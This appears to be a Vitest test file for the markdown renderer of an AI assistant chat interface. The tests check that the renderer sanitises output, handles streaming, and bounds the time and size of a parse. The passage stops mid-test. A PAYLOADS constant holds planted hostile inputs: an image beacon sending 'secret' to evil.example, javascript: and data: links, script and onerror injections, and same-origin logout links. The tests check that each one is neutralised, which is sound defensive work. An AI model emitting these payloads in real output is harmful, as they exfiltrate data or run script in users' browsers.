// Copyright 2026 OpenObserve Inc.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

import { mount } from "@vue/test-utils";
import { Marked } from "marked";
import { afterEach, beforeEach, describe, expect, it, onTestFinished, vi } from "vitest";
import { computed, defineComponent, h, nextTick } from "vue";

import {
  AssistantMarkdownCode,
  AssistantMarkdownPart,
  MAX_PARSED_CHARS,
  PARSE_TIMEOUT_MS,
  WORKER_LOAD_TIMEOUT_MS,
  markdownParseCount,
  markdownToPlainText,
  renderMarkdown,
  resetMarkdownForTests,
  setMarkdownParserForTests,
  syncMarkdownParserForTests,
  useRenderedMarkdown,
  type MarkdownParser,
  type MarkdownPart,
  type ParserEvents,
} from "./markdown";
import {
  MAX_ALT_CHARS,
  MAX_CODE_PARTS,
  MAX_HIGHLIGHT_CHARS,
  MAX_RUN_CHARS,
  MAX_TABLE_CELLS,
  MAX_URL_CHARS,
  PART_CHARS,
  PART_LINES,
  PART_TAGS,
  contentHash,
  parseBlock,
  plainResult,
  riskOf,
  type ParseRequest,
  type ParseResult,
} from "./markdownCore";

const PARSING_KEY = "o2.assistant.markdownParsing";

const KNOWN_BAD_KEY = "o2.assistant.markdownPlain";

// `99` §1.2: the planted payloads this renderer must keep inert.
const PAYLOADS = {
  img_beacon: "![x](https://evil.example/p.gif?d=secret)",
  js_link: "[click](javascript:alert(1))",
  js_link_tab: "[click](java\tscript:alert(1))",
  data_link: "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  same_tab_link: '<a href="https://evil.example" target="_self">go</a>',
  html_img: "<img src=x onerror=alert(1)>",
  script: "<script>window.__pwned = 1</script>",
  iframe: '<iframe src="https://evil.example"></iframe>',
  style: '<p style="position:fixed">x</p>',
  handler: '<div onclick="alert(1)">x</div>',
  same_origin_logout: "[Open dashboard](/web/logout)",
  same_origin_share: "[See](/web/ai/shared/abc) and [import](/web/assistant/import?token=1)",
  same_origin_autorun: "[Logs](/web/logs?sql=c2VsZWN0&run=true)",
};

// Prose HTML and plain-text parts together: what the reader sees of the block outside code and tables.
const htmlOf = (parts: MarkdownPart[]) =>
  parts
    .map((part) => (part.kind === "html" ? part.html : part.kind === "text" ? part.text : ""))
    .join("");

const render = (text: string, state: "open" | "closed" = "closed") =>
  renderMarkdown(`b${Math.random()}`, text, state);

function mountHtml(html: string) {
  return mount(AssistantMarkdownPart, {
    props: { part: { kind: "html", key: "m", html } },
    attachTo: document.body,
  });
}

const parse = (text: string) =>
  parseBlock({
    blockId: "p",
    text,
    state: "closed",
    origin: "http://localhost",
    imageRemoved: "x",
  });

const table = (columns: number, rows: number) =>
  "| " +
  "h | ".repeat(columns) +
  "\n| " +
  "- | ".repeat(columns) +
  "\n" +
  ("| " + "v | ".repeat(columns) + "\n").repeat(rows);

describe("markdown.ts strict profile", () => {
  let fetchSpy: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    resetMarkdownForTests();
    setMarkdownParserForTests(syncMarkdownParserForTests);
    fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
  });

  afterEach(() => {
    setMarkdownParserForTests(null);
    vi.useRealTimers();
    vi.unstubAllGlobals();
    document.body.innerHTML = "";
  });

  it("drops a remote image for the muted notice and never requests it (SEC-01, EB-01 AC 2)", () => {
    const html = htmlOf(render(PAYLOADS.img_beacon).parts);
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("<img");
    expect(html).toContain("Image from an external site removed");
    const wrapper = mountHtml(html);
    expect(wrapper.element.querySelectorAll("img")).toHaveLength(0);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("keeps an inline data image", () => {
    const html = htmlOf(render("![dot](data:image/png;base64,iVBORw0KGgo=)").parts);
    expect(html).toContain('<img src="data:image/png;base64,iVBORw0KGgo="');
    expect(html).toContain('alt="dot"');
  });

  it.each([
    ["js_link", PAYLOADS.js_link],
    ["js_link with a tab", PAYLOADS.js_link_tab],
    ["data_link", PAYLOADS.data_link],
  ])("renders %s as plain text, never an href (SEC-02)", (_name, payload) => {
    const html = htmlOf(render(payload).parts);
    expect(html).not.toMatch(/href=/);
    expect(html).not.toMatch(/javascript:|data:text/i);
  });

  it("opens an external link in a new tab with the host suffix (EB-01 AC 2)", () => {
    const html = htmlOf(render("Read [the docs](https://docs.openobserve.ai/x).").parts);
    const wrapper = mountHtml(html);
    const link = wrapper.element.querySelector("a")!;
    expect(link.getAttribute("href")).toBe("https://docs.openobserve.ai/x");
    expect(link.getAttribute("target")).toBe("_blank");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(wrapper.text()).toContain("docs.openobserve.ai");
  });

  it("strips raw HTML: a same-tab anchor, an img handler, script, iframe, style, on* (SEC-04, EB-01 AC 3)", () => {
    for (const payload of [
      PAYLOADS.same_tab_link,
      PAYLOADS.html_img,
      PAYLOADS.script,
      PAYLOADS.iframe,
      PAYLOADS.style,
      PAYLOADS.handler,
    ]) {
      const wrapper = mountHtml(htmlOf(render(payload).parts));
      const el = wrapper.element;
      expect(
        el.querySelectorAll("a, img, script, iframe, [style], [onclick], [onerror]"),
      ).toHaveLength(0);
      expect(el.textContent).not.toMatch(/<|onerror|evil\.example|__pwned/);
      wrapper.unmount();
    }
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it.each([
    ["same_origin_logout", PAYLOADS.same_origin_logout],
    ["same_origin_share", PAYLOADS.same_origin_share],
    ["same_origin_autorun", PAYLOADS.same_origin_autorun],
  ])(
    "renders the same-origin %s as plain text until WP-08 allowlists routes (round 1 E-06)",
    (_n, p) => {
      const wrapper = mountHtml(htmlOf(render(p).parts));
      expect(wrapper.element.querySelectorAll("a")).toHaveLength(0);
      expect(wrapper.text()).not.toContain("/web/");
    },
  );

  it("maps # and ## to h2 and ### and deeper to h3, never smaller than body text (EB-01 AC 1)", () => {
    const html = htmlOf(
      render("# One\n\n## Checkout 5xx spike\n\n### Key findings\n\n#### Deep").parts,
    );
    const wrapper = mountHtml(html);
    expect(wrapper.element.querySelectorAll("h1")).toHaveLength(0);
    expect([...wrapper.element.querySelectorAll("h2")].map((el) => el.textContent)).toEqual([
      "One",
      "Checkout 5xx spike",
    ]);
    expect([...wrapper.element.querySelectorAll("h3")].map((el) => el.textContent)).toEqual([
      "Key findings",
      "Deep",
    ]);
    expect(wrapper.get("h2").classes()).toEqual(
      expect.arrayContaining(["text-base", "font-semibold"]),
    );
    expect(wrapper.get("h3").classes()).toEqual(
      expect.arrayContaining(["text-sm", "font-semibold"]),
    );
  });

  it("splits fences out as typed parts and renders a table as plain HTML of text cells (Y3)", () => {
    const { parts } = render(
      "Intro\n\n```sql\nSELECT 1\n```\n\n| a | b |\n|---|--:|\n| `x` | **2** |\n\n```bash\nls\n```\n\n```\nraw\n```",
    );
    expect(parts.map((part) => part.kind)).toEqual(["html", "code", "html", "code", "code"]);
    expect(parts[1]).toMatchObject({ lang: "sql", code: "SELECT 1", open: false, query: true });
    const cells = htmlOf([parts[2]]);
    expect(cells).toContain('<th class="text-start">a</th>');
    expect(cells).toContain('<th class="text-end">b</th>');
    expect(cells).toContain("<td>x</td>");
    expect(cells).toContain('<td class="text-end">2</td>');
    expect(cells).not.toMatch(/<code|<strong/);
    const wrapper = mountHtml(cells);
    expect(wrapper.get('[role="region"]').attributes()).toMatchObject({
      tabindex: "0",
      "aria-label": "Table",
    });
    expect(parts[3]).toMatchObject({ lang: "bash", query: false });
    expect(parts[4]).toMatchObject({ lang: "plaintext", query: false });
  });

  it("repairs an open fence mid-stream and keeps the following Markdown out of it (EB-01 AC 5)", () => {
    const streaming = render("Before\n\n```sql\nSELECT *\nFROM t", "open");
    expect(streaming.parts.at(-1)).toMatchObject({
      kind: "code",
      code: "SELECT *\nFROM t",
      open: true,
      query: false,
    });
    const closed = render("Before\n\n```sql\nSELECT *\n```\n\nAfter **bold**", "closed");
    expect(closed.parts.map((part) => part.kind)).toEqual(["html", "code", "html"]);
    expect(htmlOf(closed.parts)).toContain("<strong>bold</strong>");
  });

  it("escapes inline code and renders it in the code chip classes", () => {
    const html = htmlOf(render("Run `<b onclick=x>` now").parts);
    expect(html).toContain("bg-code-bg");
    const wrapper = mountHtml(html);
    expect(wrapper.element.querySelectorAll("b")).toHaveLength(0);
    expect(wrapper.find("code").text()).toBe("<b onclick=x>");
  });

  it("collects claim markers and holds a split one back while streaming (EB-05 AC 7)", () => {
    const done = render("Cart returned 502 [^call_3] and [^call_1] [^call_3].");
    expect(done.claims).toEqual(["call_3", "call_1"]);
    expect(htmlOf(done.parts)).not.toContain("[^");
    expect(htmlOf(render("Cart failed [^cal", "open").parts)).not.toContain("[^cal");
  });

  it("leaves an empty slot against the cited word, never a space before punctuation", () => {
    const done = render("Cart returned 502 [^call_3], then [^call_1].");
    const html = htmlOf(done.parts);
    expect(html).toContain('502<wbr data-claim="0">, then<wbr data-claim="1">.');
    const wrapper = mountHtml(html);
    const slots = Array.from(wrapper.element.querySelectorAll("[data-claim]"));
    expect(slots.map((slot) => [slot.tagName, slot.getAttribute("data-claim")])).toEqual([
      ["SPAN", "0"],
      ["SPAN", "1"],
    ]);
    expect(slots.every((slot) => slot.childNodes.length === 0)).toBe(true);
    expect(markdownToPlainText("Rose [^c1].")).toBe("Rose.");
  });

  it("gives the model's own slot characters no slot, and a non-numeric slot no attribute", () => {
    expect(htmlOf(render("A \uE0000\uE001 b").parts)).not.toContain("data-claim");
    const table = render("| a |\n| - |\n| `\uE0000\uE001` ![\uE0000\uE001](x) [^c1] |");
    expect(htmlOf(table.parts).match(/data-claim/g)).toHaveLength(1);
    const wrapper = mountHtml('<p>x<wbr data-claim="a">y<span data-claim="0">z</span></p>');
    expect(wrapper.element.querySelectorAll("[data-claim]")).toHaveLength(0);
  });

  it("never serves another text of the same block id and length from the memo (F1)", () => {
    const first = renderMarkdown("m0:v1:0", "Answer from chat A", "closed");
    const second = renderMarkdown("m0:v1:0", "Answer from chat B", "closed");
    expect(htmlOf(second.parts)).toContain("chat B");
    expect(second).not.toBe(first);
  });

  it("keeps the text between stripped tags", () => {
    expect(htmlOf(render('<a href="https://evil.example">same tab</a> ok').parts)).toContain(
      "same tab",
    );
  });

  it("memoises by (blockId, length, state): a completed block never re-parses (HT-08 AC 2)", () => {
    const before = markdownParseCount();
    const first = renderMarkdown("t1:0", "Hello **there**", "closed");
    const again = renderMarkdown("t1:0", "Hello **there**", "closed");
    expect(again).toBe(first);
    expect(markdownParseCount() - before).toBe(1);
    renderMarkdown("t1:0", "Hello **there**!", "open");
    expect(markdownParseCount() - before).toBe(2);
  });

  it("keeps the objects of the parts a delta did not change, so their components never update", () => {
    const first = renderMarkdown("t9:0", "```\nx\n```\n\nmore", "open");
    const next = renderMarkdown("t9:0", "```\nx\n```\n\nmore text", "open");
    expect(next.parts[0]).toBe(first.parts[0]);
    expect(next.parts[1]).not.toBe(first.parts[1]);
  });

  it("renders a markdown_bomb of 10 000 nested list items in bounded time", () => {
    const bomb = Array.from({ length: 10_000 }, (_, i) => `${" ".repeat(i * 2)}- item ${i}`).join(
      "\n",
    );
    const started = performance.now();
    const { parts } = render(bomb.slice(0, MAX_PARSED_CHARS * 2));
    expect(performance.now() - started).toBeLessThan(3_000);
    expect(parts.length).toBeGreaterThan(0);
  });

  const codeOf = (parts: MarkdownPart[]) =>
    parts.filter((part) => part.kind === "code").map((part) => (part as { code: string }).code);

  it("never takes a claim marker out of a fence or inline code (S1)", () => {
    const fenced = render(
      "Use this:\n\n```sql\nWHERE msg REGEXP '[^0-9]'\n```\n\nand `[^a-z_-]` too [^call_1].",
    );
    expect(codeOf(fenced.parts)).toEqual(["WHERE msg REGEXP '[^0-9]'"]);
    expect(htmlOf(fenced.parts)).toContain("[^a-z_-]");
    expect(fenced.claims).toEqual(["call_1"]);
    expect(markdownToPlainText("```\nx =~ /[^0-9]/\n```\n\n`[^a]` ok")).toBe(
      "x =~ /[^0-9]/\n\n[^a] ok",
    );
  });

  it("keeps a streaming fence's trailing bracket while holding back a split prose marker", () => {
    expect(codeOf(render("```\nmatch [^", "open").parts)).toEqual(["match [^"]);
  });

  it.each([
    ["dashes", "- ".repeat(MAX_PARSED_CHARS / 2 - 1) + "x"],
    ["ordered", "1. ".repeat(MAX_PARSED_CHARS / 3 - 1) + "x"],
    ["quote list", "> - ".repeat(MAX_PARSED_CHARS / 4 - 1) + "x"],
    ["quotes", ">".repeat(MAX_PARSED_CHARS - 1) + "x"],
    ["unclosed emphasis", "*a ".repeat(MAX_PARSED_CHARS / 3 - 1) + "x"],
    ["quoted unclosed emphasis", "> *a\n".repeat(MAX_PARSED_CHARS / 5 - 1) + "x"],
    ["emphasis", "*a ".repeat(MAX_PARSED_CHARS / 6) + "x" + " a*".repeat(MAX_PARSED_CHARS / 6)],
    ["strong", "**a ".repeat(MAX_PARSED_CHARS / 8) + "x" + " a**".repeat(MAX_PARSED_CHARS / 8)],
    ["underscore", "_a ".repeat(MAX_PARSED_CHARS / 6) + "x" + " a_".repeat(MAX_PARSED_CHARS / 6)],
    ["strike", "~~a ".repeat(MAX_PARSED_CHARS / 8) + "x" + " a~~".repeat(MAX_PARSED_CHARS / 8)],
  ])(
    "renders a single-line %s markdown_bomb as visible text in bounded time (S2)",
    (_name, bomb) => {
      const started = performance.now();
      const { parts } = render(bomb);
      expect(performance.now() - started).toBeLessThan(3_000);
      expect(htmlOf(parts)).toContain("x");
      expect(() => markdownToPlainText(bomb)).not.toThrow();
    },
  );

  it("keeps ordinary emphasis and shows a flattened bomb's delimiters as text", () => {
    expect(htmlOf(render("Some **bold** and *em* and snake_case_name.").parts)).toContain(
      "<strong>bold</strong>",
    );
    const flat = render("*a ".repeat(20) + "x");
    expect(flat.parts.map((part) => (part as { html: string }).html).join("")).not.toContain(
      "<em>",
    );
    mountHtml(htmlOf(flat.parts));
    expect(document.body.textContent).toContain("*a *a");
    expect(markdownToPlainText("*a ".repeat(20) + "x")).toContain("*a *a");
  });

  it.each([
    ["an escaped backtick before the bomb", "\\`" + "*a ".repeat(MAX_PARSED_CHARS / 3 - 2) + "`x"],
    ["a one-line ```x``` before emphasis", "```x```\n" + "*a ".repeat(MAX_PARSED_CHARS / 3 - 4)],
    ["a one-line ```x``` before a list bomb", "```x```\n" + "- ".repeat(MAX_PARSED_CHARS / 2 - 5)],
    ["a ~~~x~~~ opener", "~~~x~~~\n" + "*a ".repeat(MAX_PARSED_CHARS / 3 - 4)],
  ])("caps a 200k bomb behind %s, as marked reads it (V1)", (_name, bomb) => {
    const started = performance.now();
    const { parts } = render(bomb);
    const elapsed = performance.now() - started;
    expect(elapsed).toBeLessThan(1_000);
    expect(parts.length).toBeGreaterThan(0);
  });

  // A parser whose jobs the spec starts and answers by hand, like a worker that has not replied yet.
  function manualParser() {
    const calls: { request: ParseRequest; events: ParserEvents; index: number }[] = [];
    const parser: MarkdownParser & { resets: number } = {
      resets: 0,
      run(requests, events) {
        requests.forEach((request, index) => calls.push({ request, events, index }));
      },
      reset() {
        parser.resets += 1;
      },
    };
    const start = (i: number) => calls[i].events.start(calls[i].index);
    const answer = (i: number, result?: ParseResult) => {
      start(i);
      calls[i].events.done(calls[i].index, result ?? parseBlock(calls[i].request));
    };
    return { parser, calls, start, answer };
  }

  const flush = async () => {
    await Promise.resolve();
    await Promise.resolve();
  };

  const big = (word: string) => `**${word}** ` + "x".repeat(3_000);

  it("parses the newest queued block first, so a transcript's bottom formats first (Z3)", async () => {
    const { parser, calls } = manualParser();
    setMarkdownParserForTests(parser);
    for (let i = 0; i < 20; i++) renderMarkdown(`n:${i}`, `block *${i}*`, "closed");
    await flush();
    expect(calls[0].request.blockId).toBe("n:19");
    expect(calls).toHaveLength(16);
  });

  it("parses every block off the main thread, the text shown at once, the newest text queued (X3)", async () => {
    const { parser, calls, answer } = manualParser();
    setMarkdownParserForTests(parser);
    const first = renderMarkdown("w:0", "Small **one**", "open");
    expect(first.parts).toEqual([{ kind: "text", key: "w:0:0", text: "Small **one**" }]);
    await flush();
    renderMarkdown("w:0", "Small **two**", "open");
    renderMarkdown("w:0", "Small **three**", "open");
    expect(calls).toHaveLength(1);
    answer(0);
    await flush();
    expect(htmlOf(renderMarkdown("w:0", "Small **three**", "open").parts)).toContain(
      "<strong>one</strong>",
    );
    expect(calls.map((call) => call.request.text)).toEqual(["Small **one**", "Small **three**"]);
    answer(1);
    expect(htmlOf(renderMarkdown("w:0", "Small **three**", "open").parts)).toContain(
      "<strong>three</strong>",
    );
  });

  it("posts the blocks of one flush together and times each from its own start (X3, X6)", async () => {
    vi.useFakeTimers();
    const { parser, calls, start, answer } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("a:0", "one", "closed");
    renderMarkdown("b:0", "two", "closed");
    await flush();
    expect(calls.map((call) => call.index)).toEqual([0, 1]);
    vi.advanceTimersByTime(PARSE_TIMEOUT_MS * 3);
    expect(parser.resets).toBe(0);
    start(0);
    vi.advanceTimersByTime(PARSE_TIMEOUT_MS / 2);
    answer(0);
    answer(1);
    expect(parser.resets).toBe(0);
  });

  it("terminates a job past its timeout, keeps a streaming block as text, retries once on completion, then text for good (F11, X6)", async () => {
    vi.useFakeTimers();
    const { parser, calls, start, answer } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("w:0", big("one"), "open");
    await flush();
    start(0);
    vi.advanceTimersByTime(PARSE_TIMEOUT_MS + 10);
    expect(parser.resets).toBe(1);
    expect(htmlOf(renderMarkdown("w:0", big("two"), "open").parts)).toContain("**two**");
    await flush();
    expect(calls).toHaveLength(1);
    renderMarkdown("w:0", big("two"), "closed");
    await flush();
    expect(calls).toHaveLength(2);
    answer(1);
    const retried = renderMarkdown("w:0", big("two"), "closed");
    expect(htmlOf(retried.parts)).toContain("<strong>two</strong>");
    expect(retried.plain).toBe(false);
  });

  it("gives a block that arrives completed one retry, then remembers it across a reload (X6, X7)", async () => {
    vi.useFakeTimers();
    const { parser, calls, start } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("h:0", big("bomb"), "closed");
    await flush();
    start(0);
    vi.advanceTimersByTime(PARSE_TIMEOUT_MS + 10);
    expect(renderMarkdown("h:0", big("bomb"), "closed").plain).toBe(false);
    await flush();
    expect(calls).toHaveLength(2);
    start(1);
    vi.advanceTimersByTime(PARSE_TIMEOUT_MS + 10);
    expect(renderMarkdown("h:0", big("bomb"), "closed").plain).toBe(true);
    expect(localStorage.getItem("o2.assistant.markdownPlain")).not.toContain("bomb");
    resetMarkdownForTests({ reload: true });
    setMarkdownParserForTests(parser);
    expect(renderMarkdown("h:9", big("bomb"), "closed").plain).toBe(true);
    await flush();
    expect(calls).toHaveLength(2);
  });

  it("re-renders only the block whose result landed (X5)", async () => {
    const { parser, calls, answer } = manualParser();
    setMarkdownParserForTests(parser);
    const runs = { a: 0, b: 0 };
    const a = computed(() => (runs.a++, renderMarkdown("a:0", "one *a*", "closed")));
    const b = computed(() => (runs.b++, renderMarkdown("b:0", "two *b*", "closed")));
    void a.value;
    void b.value;
    await flush();
    answer(calls.findIndex((call) => call.request.blockId === "a:0"));
    void a.value;
    void b.value;
    expect(runs).toEqual({ a: 2, b: 1 });
  });

  it("strips classes and same-origin links the renderer would never write, whatever the worker returns (X8)", async () => {
    const { parser, answer } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("x:0", "x", "closed");
    await flush();
    const origin = window.location.origin;
    answer(0, {
      claims: [],
      plain: "",
      parts: [
        {
          kind: "html",
          key: "x:0:0",
          html: `<p><a href="https://evil.example/" class="fixed inset-0" target="_self">x</a><a href="${origin}/logout">out</a><code class="rounded-default border-code-border bg-code-bg text-code-text border px-1 py-px font-mono text-xs">c</code></p>`,
        },
      ],
    });
    const html = mountHtml(htmlOf(renderMarkdown("x:0", "x", "closed").parts)).html();
    expect(html).not.toContain("fixed inset-0");
    expect(html).not.toContain("/logout");
    expect(html).toContain('target="_blank"');
    expect(html).toContain("font-mono");
  });

  it("drops worker highlighting that is anything but hljs spans", async () => {
    const { parser, answer } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("h:1", "x", "closed");
    await flush();
    const code = { kind: "code" as const, lang: "sql", code: "select", open: false, query: true };
    answer(0, {
      claims: [],
      plain: "",
      parts: [
        { ...code, key: "h:1:0", highlighted: '<span class="hljs-keyword">select</span>' },
        { ...code, key: "h:1:1", highlighted: '<img src=x onerror="alert(1)">' },
      ],
    });
    const [kept, dropped] = renderMarkdown("h:1", "x", "closed").parts as Extract<
      MarkdownPart,
      { kind: "code" }
    >[];
    expect(kept.highlighted).toContain("hljs-keyword");
    expect(dropped.highlighted).toBeUndefined();
  });

  it("highlights known fences in the parse, never an unknown language (X4)", () => {
    const parts = render("```sql\nSELECT 1\n```\n\n```java\nclass A {}\n```").parts as Extract<
      MarkdownPart,
      { kind: "code" }
    >[];
    expect(parts[0].highlighted).toContain("hljs-keyword");
    expect(parts[1].highlighted).toBeUndefined();
  });

  it("never rejects a block for its highlighting, and stops highlighting past the block's cap (Y5, Z2)", () => {
    const rows = Array.from({ length: 120 }, (_, i) => `{"id": ${i}, "ok": true, "n": null}`);
    const fence = "```json\n[" + rows.join(",\n") + "]\n```";
    const result = parse(Array.from({ length: 4 }, () => fence).join("\n\n"));
    expect(result.rejected).toBeUndefined();
    const code = result.parts.filter((part) => part.kind === "code") as Extract<
      MarkdownPart,
      { kind: "code" }
    >[];
    expect(code).toHaveLength(4);
    expect(code[0].highlighted).toContain("hljs-");
    expect(code.at(-1)!.highlighted).toBeUndefined();
    const total = code.reduce((sum, part) => sum + (part.highlighted?.length ?? 0), 0);
    expect(total).toBeLessThanOrEqual(MAX_HIGHLIGHT_CHARS);
  });

  it("makes at most MAX_CODE_PARTS code parts per block; later fences are plain <pre> in the HTML (Z2)", () => {
    const started = performance.now();
    const { parts } = parse("```\na\n```\n".repeat(2_000));
    expect(performance.now() - started).toBeLessThan(500);
    expect(parts.filter((part) => part.kind === "code")).toHaveLength(MAX_CODE_PARTS);
    const html = htmlOf(parts);
    expect(html.match(/<pre /g)).toHaveLength(2_000 - MAX_CODE_PARTS);
    mountHtml(html);
    expect(document.querySelectorAll("pre")).toHaveLength(2_000 - MAX_CODE_PARTS);
  });

  it.each([
    [
      "& in the query",
      "See the results below.\n\n[x](https://e.com/?" + "&".repeat(2_000) + ")\n\n**Done.**",
    ],
    ["' in the path", "[x](https://e.com/" + "'".repeat(1_800) + ")"],
    ["& in a heading in a list in a quote", "> - ## [x](https://e.com/?" + "&".repeat(1_580) + ")"],
  ])(
    "caps a link by its escaped href and always finishes splitting (Z1, F17): %s",
    (_name, text) => {
      const started = performance.now();
      const { parts, rejected } = parse(text);
      expect(performance.now() - started).toBeLessThan(500);
      expect(rejected).toBeUndefined();
      expect(parts.length).toBeLessThanOrEqual(2);
      expect(htmlOf(parts)).not.toContain("<a ");
    },
  );

  it("splits a long label inside a link near the href cap without looping (Z1, F17)", () => {
    const label = "word ".repeat(3_000);
    const text = `[${label}](https://e.com/?${"&".repeat(400)})`;
    const started = performance.now();
    const { parts } = parse(text);
    expect(performance.now() - started).toBeLessThan(500);
    expect(parts.length).toBeLessThan(10);
    const visible = (markup: string) => markup.replace(/<[^>]*>/g, "").replace(/\s/g, "");
    expect(visible(htmlOf(parts))).toContain(visible(label));
    expect(htmlOf(parts).match(/<a /g)).toHaveLength(1);
  });

  it("keeps a fence too large for one part as one <pre>, past the code cap or inside a list (Q6)", () => {
    const lines = Array.from({ length: 300 }, (_, i) => `SELECT * FROM t WHERE code = ${i}`);
    const short = "```sql\nSELECT 1\n```\n\n".repeat(MAX_CODE_PARTS);
    const inputs = [
      `${short}\`\`\`sql\n${lines.join("\n")}\n\`\`\``,
      `- item\n\n  \`\`\`\n  ${lines.join("\n  ")}\n  \`\`\``,
    ];
    for (const text of inputs) {
      const { parts } = parse(text);
      const holders = parts.filter((part) => part.kind === "html" && part.html.includes("<pre "));
      expect(holders).toHaveLength(1);
      const html = (holders[0] as { html: string }).html;
      expect(html.match(/<pre /g)).toHaveLength(1);
      expect(html).toContain("WHERE code = 0\n");
      expect(html).toContain("WHERE code = 299");
    }
  });

  it("caps image alt text, so one tag never runs a part past PART_CHARS (Q7)", () => {
    for (const alt of ["x".repeat(19_900), "&".repeat(18_000)]) {
      const { parts } = parse(`![${alt}](data:image/png;base64,AAAA)`);
      const shown = /alt="([^"]*)"/.exec(htmlOf(parts))![1].replace(/&amp;/g, "&");
      expect(Array.from(shown)).toHaveLength(MAX_ALT_CHARS + 1);
      expect(shown.endsWith("…")).toBe(true);
      for (const part of parts)
        if (part.kind === "html") expect(part.html.length).toBeLessThanOrEqual(PART_CHARS);
    }
  });

  it("checks each class of worker highlighting on its own (Y6)", async () => {
    const { parser, answer } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("h:6", "x", "closed");
    await flush();
    const code = { kind: "code" as const, lang: "js", code: "f", open: false, query: false };
    answer(0, {
      claims: [],
      plain: "",
      parts: [
        { ...code, key: "h:6:0", highlighted: '<span class="hljs-title function_">f</span>' },
        { ...code, key: "h:6:1", highlighted: '<span class="hljs-title fixed inset-0">f</span>' },
      ],
    });
    const [kept, dropped] = renderMarkdown("h:6", "x", "closed").parts as Extract<
      MarkdownPart,
      { kind: "code" }
    >[];
    expect(kept.highlighted).toContain("function_");
    expect(dropped.highlighted).toBeUndefined();
  });

  it("shows text, never parsing on the main thread, where no worker exists (X9)", () => {
    setMarkdownParserForTests(null);
    const block = renderMarkdown("n:0", "Some **bold**", "closed");
    expect(block.parts).toEqual([{ kind: "text", key: "n:0:0", text: "Some **bold**" }]);
  });

  describe("with a Worker that fails or crashes", () => {
    const instances: FakeWorker[] = [];
    class FakeWorker {
      onmessage: ((event: MessageEvent) => void) | null = null;
      onerror: (() => void) | null = null;
      posted: unknown[] = [];
      terminated = false;
      constructor() {
        instances.push(this);
      }
      postMessage(message: unknown) {
        this.posted.push(message);
      }
      terminate() {
        this.terminated = true;
      }
      send(data: unknown) {
        this.onmessage?.({ data } as MessageEvent);
      }
    }

    beforeEach(() => {
      instances.length = 0;
      vi.stubGlobal("Worker", FakeWorker);
      setMarkdownParserForTests(null);
    });

    it("retries a worker that fails to load once, and posts only after it says ready (X6)", async () => {
      renderMarkdown("l:0", "one", "closed");
      await flush();
      instances[0].onerror?.();
      expect(instances).toHaveLength(2);
      expect(instances[1].posted).toHaveLength(0);
      instances[1].send({ type: "ready" });
      expect(instances[1].posted).toHaveLength(1);
      instances[1].send({ type: "start", index: 0 });
      instances[1].send({
        type: "done",
        index: 0,
        result: parseBlock({
          blockId: "l:0",
          text: "one *a*",
          state: "closed",
          origin: "",
          imageRemoved: "",
        }),
      });
      expect(htmlOf(renderMarkdown("l:0", "one", "closed").parts)).toContain("<em>a</em>");
    });

    it("never turns the page to text after one worker crashes (F13)", async () => {
      renderMarkdown("c:0", big("bomb"), "closed");
      await flush();
      instances[0].send({ type: "ready" });
      instances[0].send({ type: "start", index: 0 });
      instances[0].onerror?.();
      expect(instances[0].terminated).toBe(true);
      renderMarkdown("c:1", "next *one*", "closed");
      await flush();
      expect(instances).toHaveLength(2);
      instances[1].send({ type: "ready" });
      expect(instances[1].posted).toHaveLength(1);
    });

    it("waits for a slow worker load without timing out its first job (X6)", async () => {
      vi.useFakeTimers();
      renderMarkdown("s:0", "slow", "closed");
      await flush();
      vi.advanceTimersByTime(WORKER_LOAD_TIMEOUT_MS - 100);
      instances[0].send({ type: "ready" });
      instances[0].send({ type: "start", index: 0 });
      vi.advanceTimersByTime(PARSE_TIMEOUT_MS / 2);
      expect(instances[0].terminated).toBe(false);
    });
  });

  it("answers Copy answer from the render's own plain text, and through the worker for a block not yet rendered", async () => {
    const { parser, answer } = manualParser();
    setMarkdownParserForTests(parser);
    renderMarkdown("w:0", big("one"), "closed");
    const pending = markdownToPlainText(big("one"));
    expect(pending).toBeInstanceOf(Promise);
    await flush();
    answer(0);
    await expect(pending).resolves.toContain("one " + "x".repeat(10));
    expect(markdownToPlainText(big("one"))).toContain("one ");
  });

  it.each([
    [
      "wide table",
      "|" + "a|".repeat(2_500) + "\n|" + "-|".repeat(2_500) + "\n" + "|x\n".repeat(3_333),
    ],
    ["tall table", "|a|b|c|d|\n|-|-|-|-|\n" + "|1|2|3|4|\n".repeat(MAX_TABLE_CELLS / 4)],
    [
      "wide table in a quote",
      "> |" + "a|".repeat(2_500) + "\n> |" + "-|".repeat(2_500) + "\n" + "> |x\n".repeat(3_333),
    ],
    [
      "tall table in a list in a quote",
      "> - |a|b|c|d|\n>   |-|-|-|-|\n" + ">   |1|2|3|4|\n".repeat(MAX_TABLE_CELLS / 4),
    ],
    [
      "table after a fence opened in a quote",
      "> ```\n\n" +
        "|" +
        "a|".repeat(1_000) +
        "\n|" +
        "-|".repeat(1_000) +
        "\n" +
        "|x\n".repeat(2_000),
    ],
    [
      "table after a fence opened in a list",
      "- a\n  ```\n\n" +
        "|" +
        "a|".repeat(1_000) +
        "\n|" +
        "-|".repeat(1_000) +
        "\n" +
        "|x\n".repeat(2_000),
    ],
  ])("never builds the cells of a %s past the caps (W2, F12, X2)", (_name, text) => {
    const started = performance.now();
    const block = render(text);
    expect(performance.now() - started).toBeLessThan(1_000);
    expect(block.plain).toBe(true);
    expect(htmlOf(block.parts)).not.toContain("<td");
